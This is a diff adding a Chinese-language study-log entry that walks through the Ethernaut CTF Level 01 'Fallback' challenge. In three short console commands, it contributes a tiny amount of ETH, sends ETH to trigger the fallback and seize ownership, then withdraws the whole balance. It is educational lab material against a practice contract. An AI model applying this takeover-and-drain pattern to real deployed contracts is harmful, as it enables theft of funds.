@@ -46,5 +46,34 @@ Level 00 instance 合约代码参见 Writeup [Ethernaut/src/hello.sol](Writeup/S
 
 
 ### 2024.08.30
+今天做Ethernaut CTF Level 01 Fallback:
+
+要求更改合约 owner 并提取全部的 balance
+
+首先调用 contribute 函数，支付ETH 金额小余 0.001，
+
+```solidity
+await contract.contribute({value: toWei("0.0001")})
+```
+
+然后，向合约发送 0.0001 ETH 
+
+```solidity
+await contract.send(toWei("0.0001"))
+```
+
+成交发起交易后， 合约的 owner 被设置为 msg.sender 的地址， 再调用合约的 withdraw 方法取出全部余额
+
+```solidity
+await contract.withdraw()
+```
+
+至此通关啦！！！
+
+POC: [点这里](Writeup/SpeedX/src/Ethernaut/fallback.sol)
+
+### 2024.08.31
+
+### 2024.09.01
 
 <!-- Content_END -->
